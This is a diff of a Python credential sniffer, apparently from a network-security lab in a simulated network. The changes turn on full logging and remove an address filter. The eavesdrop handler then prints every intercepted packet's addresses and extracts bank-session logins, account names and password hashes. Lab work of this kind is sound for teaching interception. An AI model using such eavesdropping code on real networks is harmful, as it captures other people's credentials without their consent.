@@ -1,7 +1,7 @@
 from .lab3a import *
 
-# logging.getLogger().setLevel(logging.NOTSET)  # this logs *everything*
-# logging.getLogger().addHandler(logging.StreamHandler())  # logs to stderr
+logging.getLogger().setLevel(logging.NOTSET)  # this logs *everything*
+logging.getLogger().addHandler(logging.StreamHandler())  # logs to stderr
 
 
 class eavesdrop(asyncio.Protocol):
@@ -17,43 +17,43 @@ class eavesdrop(asyncio.Protocol):
         pass
 
     def demux(self, src, srcPort, dst, dstPort, demuxData):
-        if src == '20174.1.2333.2333' or dst == '20174.1.1337.1':
-            print(src)
-            print(srcPort)
-            print(dst)
-            print(dstPort)
-            d = PacketType.Deserializer()
-            d.update(demuxData)
 
-            # class OpenSession(PacketType):
-            #     DEFINITION_IDENTIFIER = "apps.bank.OpenSession"
-            #     DEFINITION_VERSION = "1.0"
-            #     FIELDS = [
-            #         ("ClientNonce", UINT64),
-            #         ("Login", STRING),
-            #         ("PasswordHash", STRING)
-            #     ]
-            #
-            # class SessionOpen(PacketType):
-            #     DEFINITION_IDENTIFIER = "apps.bank.SessionOpen"
-            #     DEFINITION_VERSION = "1.0"
-            #     FIELDS = [
-            #         ("ClientNonce", UINT64),
-            #         ("ServerNonce", UINT64),
-            #         ("Account", STRING)
-            #     ]
+        print(src)
+        print(srcPort)
+        print(dst)
+        print(dstPort)
+        d = PacketType.Deserializer()
+        d.update(demuxData)
 
-            for pkt in d.nextPackets():
-                print("this packet is:" + pkt.DEFINITION_IDENTIFIER)
-                if (isinstance(pkt, SessionOpen)):
-                    print("account:")
-                    print(pkt.Account)
+        # class OpenSession(PacketType):
+        #     DEFINITION_IDENTIFIER = "apps.bank.OpenSession"
+        #     DEFINITION_VERSION = "1.0"
+        #     FIELDS = [
+        #         ("ClientNonce", UINT64),
+        #         ("Login", STRING),
+        #         ("PasswordHash", STRING)
+        #     ]
+        #
+        # class SessionOpen(PacketType):
+        #     DEFINITION_IDENTIFIER = "apps.bank.SessionOpen"
+        #     DEFINITION_VERSION = "1.0"
+        #     FIELDS = [
+        #         ("ClientNonce", UINT64),
+        #         ("ServerNonce", UINT64),
+        #         ("Account", STRING)
+        #     ]
 
-                if (isinstance(pkt, OpenSession)):
-                    print("login:")
-                    print(pkt.Login)
-                    print("passwordhash")
-                    print(pkt.PasswordHash)
+        for pkt in d.nextPackets():
+            print("this packet is:" + pkt.DEFINITION_IDENTIFIER)
+            if (isinstance(pkt, SessionOpen)):
+                print("account:")
+                print(pkt.Account)
+
+            if (isinstance(pkt, OpenSession)):
+                print("login:")
+                print(pkt.Login)
+                print("passwordhash")
+                print(pkt.PasswordHash)
 
 
 if __name__ == '__main__':
